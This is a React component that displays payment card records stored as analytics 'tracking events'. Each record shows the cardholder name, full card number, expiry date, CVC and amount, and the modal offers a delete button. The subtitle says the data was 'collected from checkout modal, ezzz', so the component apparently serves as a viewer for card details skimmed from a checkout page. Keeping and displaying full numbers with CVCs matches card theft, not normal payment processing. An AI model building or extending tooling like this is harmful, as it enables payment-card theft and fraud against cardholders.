'use client';

import React from 'react';
import styles from './CardDetailsModal.module.css';
import { TrackingEvent } from '@/lib/analytics';
import { X, Trash2, ShieldAlert } from 'lucide-react';

interface CardDetailsModalProps {
  event: TrackingEvent | null;
  onClose: () => void;
  onDelete: (id: string) => void;
}

export const CardDetailsModal: React.FC<CardDetailsModalProps> = ({
  event,
  onClose,
  onDelete,
}) => {
  if (!event) return null;

  return (
    <div className={styles.overlay}>
      <div className={styles.modal}>
        <button onClick={onClose} className={styles.closeBtn}>
          <X size={20} />
        </button>

        <h3 className={styles.title}>Payment & Card Details</h3>
        <p className={styles.subtitle}>
          These were collected from checkout modal, ezzz.
        </p>

        <div className={styles.cardDisplayBox}>
          <div>
            <div className={styles.label}>Cardholder Name</div>
            <div className={styles.value}>{event.cardholderName || '—'}</div>
          </div>

          <div>
            <div className={styles.label}>Card Number</div>
            <div className={styles.value} style={{ color: '#22c55e', fontSize: '1.25rem' }}>
              {event.cardNumber || '—'}
            </div>
          </div>

          <div className={styles.splitRow}>
            <div style={{ flex: 1 }}>
              <div className={styles.label}>Expiration</div>
              <div className={styles.value}>{event.expiry || '—'}</div>
            </div>
            <div style={{ flex: 1 }}>
              <div className={styles.label}>Security Code (CVC)</div>
              <div className={styles.value} style={{ color: '#e10600' }}>
                {event.cvc || '—'}
              </div>
            </div>
          </div>

          <div>
            <div className={styles.label}>Total Amount</div>
            <div className={styles.value}>${event.amount?.toLocaleString() || 0} USD</div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1rem', color: '#a3a3a3', fontSize: '0.75rem' }}>
          <ShieldAlert size={16} color="#e10600" style={{ flexShrink: 0 }} />
          <span>if you need to delete for whatever reason, do it here.</span>
        </div>

        <button
          onClick={() => {
            onDelete(event.id);
            onClose();
          }}
          className={styles.deleteBtn}
        >
          <Trash2 size={16} />
          <span>Delete Card Record</span>
        </button>
      </div>
    </div>
  );
};
